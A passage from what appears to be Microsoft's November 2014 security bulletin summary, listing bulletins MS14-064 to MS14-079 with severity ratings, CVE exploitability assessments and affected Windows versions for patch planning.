| [MS14-064](https://go.microsoft.com/fwlink/?linkid=518106) | **Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443)**\ \ This security update resolves two privately reported vulnerabilities in Microsoft Windows Object Linking and Embedding (OLE). The most severe of these vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Internet Explorer. An attacker who successfully exploited the vulnerabilities could run arbitrary code in the context of the current user. If the current user is logged on with administrative user rights, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. | [Critical](https://go.microsoft.com/fwlink/?linkid=21140)  \ Remote Code Execution | May require restart | Microsoft Windows |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | **Cumulative Security Update for Internet Explorer (3003057)**\ \ This security update resolves seventeen privately reported vulnerabilities in Internet Explorer. The most severe of these vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Internet Explorer. An attacker who successfully exploited these vulnerabilities could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights. | [Critical](https://go.microsoft.com/fwlink/?linkid=21140)  \ Remote Code Execution | Requires restart | Microsoft Windows,\ Internet Explorer |
| [MS14-066](https://go.microsoft.com/fwlink/?linkid=518112) | **Vulnerability in Schannel Could Allow Remote Code Execution (2992611)**\ \ This security update resolves a privately reported vulnerability in the Microsoft Secure Channel (Schannel) security package in Windows. The vulnerability could allow remote code execution if an attacker sends specially crafted packets to a Windows server. | [Critical](https://go.microsoft.com/fwlink/?linkid=21140)  \ Remote Code Execution | Requires restart | Microsoft Windows |
| [MS14-067](https://go.microsoft.com/fwlink/?linkid=513100) | **Vulnerability in XML Core Services Could Allow Remote Code Execution (2993958)**\ \ This security update resolves a privately reported vulnerability in Microsoft Windows. The vulnerability could allow remote code execution if a logged-on user visits a specially crafted website that is designed to invoke Microsoft XML Core Services (MSXML) through Internet Explorer. In all cases, however, an attacker would have no way to force users to visit such websites. Instead, an attacker would have to convince users to visit a website, typically by getting them to click a link in an email message or in an Instant Messenger request that takes users to the attacker's website. | [Critical](https://go.microsoft.com/fwlink/?linkid=21140)  \ Remote Code Execution | May require restart | Microsoft Windows |
| [MS14-068](https://go.microsoft.com/fwlink/?linkid=518109) | **Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780)**\ \ This security update resolves a privately reported vulnerability in Microsoft Windows Kerberos KDC that could allow an attacker to elevate unprivileged domain user account privileges to those of the domain administrator account. An attacker could use these elevated privileges to compromise any computer in the domain, including domain controllers. An attacker must have valid domain credentials to exploit this vulnerability. The affected component is available remotely to users who have standard user accounts with domain credentials; this is not the case for users with local account credentials only. When this security bulletin was issued, Microsoft was aware of limited, targeted attacks that attempt to exploit this vulnerability. | [Critical](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | Requires restart | Microsoft Windows |
| [MS14-069](https://go.microsoft.com/fwlink/?linkid=518105) | **Vulnerabilities in Microsoft Office Could Allow Remote Code Execution (3009710)**\ \ This security update resolves three privately reported vulnerabilities in Microsoft Office. The vulnerabilities could allow remote code execution if a specially crafted file is opened in an affected edition of Microsoft Office 2007. An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Remote Code Execution | May require restart | Microsoft Office |
| [MS14-070](https://go.microsoft.com/fwlink/?linkid=507675) | **Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935)**\ \ This security update resolves a publically reported vulnerability in TCP/IP that occurs during input/output control (IOCTL) processing. This vulnerability could allow elevation of privilege if an attacker logs on to a system and runs a specially crafted application. An attacker who successfully exploited this vulnerability could run arbitrary code in the context of another process. If this process runs with administrator privileges, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | May require restart | Microsoft Windows |
| [MS14-071](https://go.microsoft.com/fwlink/?linkid=518113) | **Vulnerability in Windows Audio Service Could Allow Elevation of Privilege (3005607**)\ \ This security update resolves a privately reported vulnerability in Microsoft Windows. The vulnerability could allow elevation of privilege if an application uses the Microsoft Windows Audio service. The vulnerability by itself does not allow arbitrary code to be run. The vulnerability would have to be used in conjunction with another vulnerability that allowed remote code execution. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | Requires restart | Microsoft Windows |
| [MS14-072](https://go.microsoft.com/fwlink/?linkid=518107) | **Vulnerability in .NET Framework Could Allow Elevation of Privilege (3005210)**\ \ This security update resolves a privately reported vulnerability in Microsoft .NET Framework. The vulnerability could allow elevation of privilege if an attacker sends specially crafted data to an affected workstation or server that uses .NET Remoting. Only custom applications that have been specifically designed to use .NET Remoting would expose a system to the vulnerability. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | May require restart | Microsoft Windows,\ Microsoft .NET Framework |
| [MS14-073](https://go.microsoft.com/fwlink/?linkid=513105) | **Vulnerability in Microsoft SharePoint Foundation Could Allow Elevation of Privilege (3000431)**\ \ This security update resolves a privately reported vulnerability in Microsoft SharePoint Server. An authenticated attacker who successfully exploited this vulnerability could run arbitrary script in the context of the user on the current SharePoint site. In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit these vulnerabilities and then convince a user to view the website. The attacker could also take advantage of compromised websites and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit these vulnerabilities. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by getting them to click a link in an email message or in an Instant Messenger message that takes users to the attacker's website, or by getting them to open an attachment sent through email. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | May require restart | Microsoft Server Software |
| [MS14-074](https://go.microsoft.com/fwlink/?linkid=518111) | **Vulnerability in Remote Desktop Protocol Could Allow Security Feature Bypass (3003743)**\ \ This security update resolves a privately reported vulnerability in Microsoft Windows. The vulnerability could allow security feature bypass when Remote Desktop Protocol (RDP) fails to properly log audit events. By default, RDP is not enabled on any Windows operating system. Systems that do not have RDP enabled are not at risk. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Security Feature Bypass | Requires restart | Microsoft Windows |
| [MS14-076](https://go.microsoft.com/fwlink/?linkid=509986) | **Vulnerability in Internet Information Services (IIS) Could Allow Security Feature Bypass (2982998)**\ \ This security update resolves a privately reported vulnerability in Microsoft Internet Information Services (IIS) that could lead to a bypass of the "IP and domain restrictions" security feature. Successful exploitation of this vulnerability could result in clients from restricted or blocked domains having access to restricted web resources. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Security Feature Bypass | May require restart | Microsoft Windows |
| [MS14-077](https://go.microsoft.com/fwlink/?linkid=518108) | **Vulnerability in Active Directory Federation Services Could Allow Information Disclosure (3003381)**\ \ This security update resolves a privately reported vulnerability in Active Directory Federation Services (AD FS). The vulnerability could allow information disclosure if a user leaves their browser open after logging off from an application, and an attacker reopens the application in the browser immediately after the user has logged off. | [Important](https://go.microsoft.com/fwlink/?linkid=21140)  \ Information Disclosure | May require restart | Microsoft Windows |
| [MS14-078](https://go.microsoft.com/fwlink/?linkid=509952) | **Vulnerability in IME (Japanese) Could Allow Elevation of Privilege (2992719)**\ \ This security update resolves a privately reported vulnerability in Microsoft Input Method Editor (IME) (Japanese). The vulnerability could allow sandbox escape based on the application sandbox policy on a system where an affected version of the Microsoft IME (Japanese) is installed. An attacker who successfully exploited this vulnerability could escape the sandbox of a vulnerable application and gain access to the affected system with logged-in user rights. If the affected system is logged in with administrative rights, an attacker could then install programs; view, change or delete data; or create new accounts with full administrative rights. | [Moderate](https://go.microsoft.com/fwlink/?linkid=21140)  \ Elevation of Privilege | May require restart | Microsoft Windows,\ Microsoft Office |
| [MS14-079](https://go.microsoft.com/fwlink/?linkid=518110) | **Vulnerability in Kernel Mode Driver Could Allow Denial of Service (3002885)**\ \ This security update resolves a privately reported vulnerability in Microsoft Windows. The vulnerability could allow denial of service if an attacker places a specially crafted TrueType font on a network share and a user subsequently navigates there in Windows Explorer. In a web-based attack scenario, an attacker could host a website that contains a webpage that is used to exploit this vulnerability. In addition, compromised websites and websites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit such websites. Instead, an attacker would have to persuade users to visit a website, typically by getting them to click a link in an email message or Instant Messenger message that takes them to the attacker's website. | [Moderate](https://go.microsoft.com/fwlink/?linkid=21140)  \ Denial of Service | Requires restart | Microsoft Windows |

## Exploitability Index

The following table provides an exploitability assessment of each of the vulnerabilities addressed this month. The vulnerabilities are listed in order of bulletin ID then CVE ID. Only vulnerabilities that have a severity rating of Critical or Important in the bulletins are included.

Use this table to learn about the likelihood of code execution and denial of service exploits within 30 days of security bulletin release, for each of the security updates that you may need to install. Review each of the assessments below, in accordance with your specific configuration, to prioritize your deployment of this month's updates. For more information about what these ratings mean, and how they are determined, please see [Microsoft Exploitability Index](https://technet.microsoft.com/security/cc998259).

In the columns below, "Latest Software Release" refers to the subject software, and "Older Software Releases" refers to all older, supported releases of the subject software, as listed in the "Affected Software" and "Non-Affected Software" tables in the bulletin.

| **Bulletin ID** | **Vulnerability Title** | **CVE ID** | **Exploitability Assessment for Latest Software Release** | **Exploitability Assessment for Older Software Release** | **Denial of Service Exploitability Assessment** | **Key Notes** |
| --- | --- | --- | --- | --- | --- | --- |
| [MS14-064](https://go.microsoft.com/fwlink/?linkid=518106) | Windows OLE Automation Array Remote Code Execution Vulnerability | [CVE-2014-6332](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6332) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-064](https://go.microsoft.com/fwlink/?linkid=518106) | Windows OLE Remote Code Execution Vulnerability | [CVE-2014-6352](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6352) | 0- Exploitation Detected | 0- Exploitation Detected | Not Applicable | Microsoft is aware of limited attacks that attempt to exploit this vulnerability. This vulnerability was first described in Microsoft Security Advisory [3010060](https://technet.microsoft.com/library/security/3010060.aspx). |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-4143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4143) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Clipboard Information Disclosure Vulnerability | [CVE-2014-6323](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6323) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | This is an information disclosure vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6337](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6337) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer ASLR Bypass Vulnerability | [CVE-2014-6339](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6339) | Not Affected | 1- Exploitation More Likely | Not Applicable | This is a security feature bypass vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Cross-domain Information Disclosure Vulnerability | [CVE-2014-6340](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6340) | 2- Exploitation Less Likely | 2- Exploitation Less Likely | Not Applicable | This is an information disclosure vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6341](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6341) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6342](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6342) | Not Affected | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6343](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6343) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6344](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6344) | Not Affected | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Cross-domain Information Disclosure Vulnerability | [CVE-2014-6345](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6345) | Not Affected | 2- Exploitation Less Likely | Not Applicable | This is an information disclosure vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Cross-domain Information Disclosure Vulnerability | [CVE-2014-6346](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6346) | 2- Exploitation Less Likely | 2- Exploitation Less Likely | Not Applicable | This is an information disclosure vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6347](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6347) | 1- Exploitation More Likely | Not Affected | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6348](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6348) | Not Affected | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Elevation of Privilege Vulnerability | [CVE-2014-6349](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6349) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Elevation of Privilege Vulnerability | [CVE-2014-6350](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6350) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6351](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6351) | 1- Exploitation More Likely | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-065](https://go.microsoft.com/fwlink/?linkid=518103) | Internet Explorer Memory Corruption Vulnerability | [CVE-2014-6353](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6353) | Not Affected | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-066](https://go.microsoft.com/fwlink/?linkid=518112) | Microsoft Schannel Remote Code Execution Vulnerability | [CVE-2014-6321](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6321) | 1- Exploitation More Likely | 1- Exploitation More Likely | Permanent | (None) |
| [MS14-067](https://go.microsoft.com/fwlink/?linkid=513100) | MSXML Remote Code Execution Vulnerability | [CVE-2014-4118](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4118) | 2- Exploitation Less Likely | 2- Exploitation Less Likely | Not Applicable | (None) |
| [MS14-068](https://go.microsoft.com/fwlink/?linkid=518109) | Kerberos Checksum Vulnerability | [CVE-2014-6324](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6324) | 1- Exploitation More Likely | 0- Exploitation Detected | Not Applicable | This is an elevation of privilege vulnerability. Microsoft is aware of limited, targeted attacks that attempt to exploit this vulnerability. |
| [MS14-069](https://go.microsoft.com/fwlink/?linkid=518105) | Microsoft Office Double Delete Remote Code Execution Vulnerability | [CVE-2014-6333](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6333) | Not Affected | 2- Exploitation Less Likely | Not Applicable | (None) |
| [MS14-069](https://go.microsoft.com/fwlink/?linkid=518105) | Microsoft Office Bad Index Remote Code Execution Vulnerability | [CVE-2014-6334](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6334) | Not Affected | 2- Exploitation Less Likely | Not Applicable | (None) |
| [MS14-069](https://go.microsoft.com/fwlink/?linkid=518105) | Microsoft Office Invalid Pointer Remote Code Execution Vulnerability | [CVE-2014-6335](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6335) | Not Affected | 1- Exploitation More Likely | Not Applicable | (None) |
| [MS14-070](https://go.microsoft.com/fwlink/?linkid=507675) | TCP/IP Elevation of Privilege Vulnerability | [CVE-2014-4076](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4076) | Not Affected | 2- Exploitation Less Likely | Permanent | This is an elevation of privilege vulnerability. |
| [MS14-071](https://go.microsoft.com/fwlink/?linkid=518113) | Windows Audio Service Vulnerability | [CVE-2014-6322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6322) | 2- Exploitation Less Likely | 2- Exploitation Less Likely | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-072](https://go.microsoft.com/fwlink/?linkid=518107) | TypeFilterLevel Vulnerability | [CVE-2014-4149](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4149) | 2- Exploitation Less Likely | 2- Exploitation Less Likely | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-073](https://go.microsoft.com/fwlink/?linkid=513105) | SharePoint Elevation of Privilege Vulnerability | [CVE-2014-4116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4116) | Not Affected | 2- Exploitation Less Likely | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-074](https://go.microsoft.com/fwlink/?linkid=518111) | Remote Desktop Protocol (RDP) Failure to Audit Vulnerability | [CVE-2014-6318](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6318) | 3- Exploitation Unlikely | 3- Exploitation Unlikely | Not Applicable | This is a security feature bypass vulnerability. |
| [MS14-076](https://go.microsoft.com/fwlink/?linkid=509986) | IIS Security Feature Bypass Vulnerability | [CVE-2014-4078](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4078) | 3- Exploitation Unlikely | 3- Exploitation Unlikely | Not Applicable | This is a security feature bypass vulnerability. |
| [MS14-077](https://go.microsoft.com/fwlink/?linkid=518108) | Active Directory Federation Services Information Disclosure Vulnerability | [CVE-2014-6331](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6331) | 3- Exploitation Unlikely | 3- Exploitation Unlikely | Not Applicable | This is an information disclosure vulnerability. |
| [MS14-078](https://go.microsoft.com/fwlink/?linkid=509952) | Microsoft IME (Japanese) Elevation of Privilege Vulnerability | [CVE-2014-4077](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4077) | Not Affected | 0- Exploitation Detected | Not Applicable | This is an elevation of privilege vulnerability. |
| [MS14-079](https://go.microsoft.com/fwlink/?linkid=518110) | Denial of Service in Windows Kernel Mode Driver Vulnerability | [CVE-2014-6317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6317) | 3- Exploitation Unlikely | 3- Exploitation Unlikely | Permanent | This is a denial of service vulnerability. |

## Affected Software

The following tables list the bulletins in order of major software category and severity.

Use these tables to learn about the security updates that you may need to install. You should review each software program or component listed to see whether any security updates pertain to your installation. If a software program or component is listed, then the severity rating of the software update is also listed.

**Note** You may have to install several security updates for a single vulnerability. Review the whole column for each bulletin identifier that is listed to verify the updates that you have to install, based on the programs or components that you have installed on your system.

### Windows Operating System and Components

|\*\*Windows Server 2003\*\*|
|------------|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Server 2003 Service Pack 2|Windows Server 2003 Service Pack 2 (3006226) (Critical)|Internet Explorer 6 (3003057) (Moderate) Internet Explorer 7 (3003057) (Moderate) Internet Explorer 8 (3003057) (Moderate)|Windows Server 2003 Service Pack 2 (2992611) (Critical)|Windows Server 2003 Service Pack 2 (2993958) (Important)|Windows Server 2003 Service Pack 2 (3011780) (Critical)|Windows Server 2003 Service Pack 2 (2989935) (Important)|Not applicable|Microsoft .NET Framework 1.1 Service Pack 1 (2978114) (Important) Microsoft .NET Framework 2.0 Service Pack 2 (2978124) (Important) Microsoft .NET Framework 4 (2978125) (Important)|Not applicable|Not applicable|Not applicable|Windows Server 2003 Service Pack 2 (2991963) (Moderate)|Windows Server 2003 Service Pack 2 (3002885) (Moderate)|
|Windows Server 2003 x64 Edition Service Pack 2|Windows Server 2003 x64 Edition Service Pack 2 (3006226) (Critical)|Internet Explorer 6 (3003057) (Moderate) Internet Explorer 7 (3003057) (Moderate) Internet Explorer 8 (3003057) (Moderate)|Windows Server 2003 x64 Edition Service Pack 2 (2992611) (Critical)|Windows Server 2003 x64 Edition Service Pack 2 (2993958) (Important)|Windows Server 2003 x64 Edition Service Pack 2 (3011780) (Critical)|Windows Server 2003 x64 Edition Service Pack 2 (2989935) (Important)|Not applicable|Microsoft .NET Framework 2.0 Service Pack 2 (2978124) (Important) Microsoft .NET Framework 4 (2978125) (Important)|Not applicable|Not applicable|Not applicable|Windows Server 2003 x64 Edition Service Pack 2 (2991963) (Moderate)|Windows Server 2003 x64 Edition Service Pack 2 (3002885) (Moderate)|
|Windows Server 2003 with SP2 for Itanium-based Systems|Windows Server 2003 with SP2 for Itanium-based Systems (3006226) (Critical)|Internet Explorer 6 (3003057) (Moderate) Internet Explorer 7 (3003057) (Moderate)|Windows Server 2003 with SP2 for Itanium-based Systems (2992611) (Critical)|Windows Server 2003 with SP2 for Itanium-based Systems (2993958) (Important)|Windows Server 2003 with SP2 for Itanium-based Systems (3011780) (Critical)|Windows Server 2003 with SP2 for Itanium-based Systems (2989935) (Important)|Not applicable|Microsoft .NET Framework 2.0 Service Pack 2 (2978124) (Important) Microsoft .NET Framework 4 (2978125) (Important)|Not applicable|Not applicable|Not applicable|Windows Server 2003 with SP2 for Itanium-based Systems (2991963) (Moderate)|Windows Server 2003 with SP2 for Itanium-based Systems (3002885) (Moderate)|
|\*\*Windows Vista\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Vista Service Pack 2|Windows Vista Service Pack 2 (3006226) (Critical) Windows Vista Service Pack 2 (3010788) (Important)|Internet Explorer 7 (3003057) (Critical) Internet Explorer 8 (3003057) (Critical) Internet Explorer 9 (3003057) (Critical)|Windows Vista Service Pack 2 (2992611) (Critical)|Windows Vista Service Pack 2 (2993958) (Critical)|Windows Vista Service Pack 2 (3011780) (No severity rating)[1]|Not applicable|Windows Vista Service Pack 2 (3005607) (Important)|Microsoft .NET Framework 2.0 Service Pack 2 (2978116) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Vista Service Pack 2 (3003743) (Important)|Not applicable|Not applicable|Windows Vista Service Pack 2 (2991963) (Moderate)|Windows Vista Service Pack 2 (3002885) (Moderate)|
|Windows Vista x64 Edition Service Pack 2|Windows Vista x64 Edition Service Pack 2 (3006226) (Critical) Windows Vista x64 Edition Service Pack 2 (3010788) (Important)|Internet Explorer 7 (3003057) (Critical) Internet Explorer 8 (3003057) (Critical) Internet Explorer 9 (3003057) (Critical)|Windows Vista x64 Edition Service Pack 2 (2992611) (Critical)|Windows Vista x64 Edition Service Pack 2 (2993958) (Critical)|Windows Vista x64 Edition Service Pack 2 (3011780) (No severity rating)[1]|Not applicable|Windows Vista x64 Edition Service Pack 2 (3005607) (Important)|Microsoft .NET Framework 2.0 Service Pack 2 (2978116) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Vista x64 Edition Service Pack 2 (3003743) (Important)|Not applicable|Not applicable|Windows Vista x64 Edition Service Pack 2 (2991963) (Moderate)|Windows Vista x64 Edition Service Pack 2 (3002885) (Moderate)|
|\*\*Windows Server 2008\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
